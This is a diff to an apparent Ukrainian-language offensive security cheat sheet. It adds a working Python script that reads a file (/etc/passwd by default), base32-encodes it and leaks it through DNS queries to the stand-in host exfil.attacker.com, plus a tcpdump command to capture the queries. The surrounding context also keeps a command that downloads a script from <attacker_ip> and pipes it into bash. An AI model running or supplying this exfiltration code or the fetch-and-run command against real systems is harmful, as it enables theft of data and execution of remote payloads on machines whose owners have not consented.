@@ -99,6 +99,7 @@ function __wget() {
 ```bash
 __wget http://<attacker_ip>/file.sh | bash
 ```
+Все виконуємо виключно в терміналі.
 
 ---
 
@@ -173,7 +174,38 @@ tcpdump -i any port 53 -w exfil.pcap
 
 ### 🔸 На таргеті:
 ```python
-# Python script to send DNS queries with encoded data
+import base64
+import socket
+import time
+
+def exfiltrate_dns(file_path, domain="exfil.attacker.com", delay=0.5):
+    with open(file_path, "rb") as f:
+        data = f.read()
+
+    # Кодування в base32 (для безпечного використання у DNS)
+    encoded = base64.b32encode(data).decode()
+
+    # Розбиваємо на шматки (DNS піддомен <= 63 символи)
+    chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
+
+    print(f"[+] Exfiltrating {len(chunks)} chunks via DNS to {domain}")
+    for i, chunk in enumerate(chunks):
+        subdomain = f"{chunk.lower()}.{domain}"
+        try:
+            # Викликаємо DNS lookup (без очікування відповіді)
+            socket.gethostbyname(subdomain)
+        except:
+            pass
+        print(f"[{i+1}/{len(chunks)}] Sent: {subdomain}")
+        time.sleep(delay)
+
+if __name__ == "__main__":
+    exfiltrate_dns("/etc/passwd", domain="exfil.attacker.com")
+```
+
+### 🔸 Просто слухати DNS-пакети:
+```bash
+tcpdump -i any port 53 -w exfil.pcap
 ```
 
 ### 🔸 Аналіз:
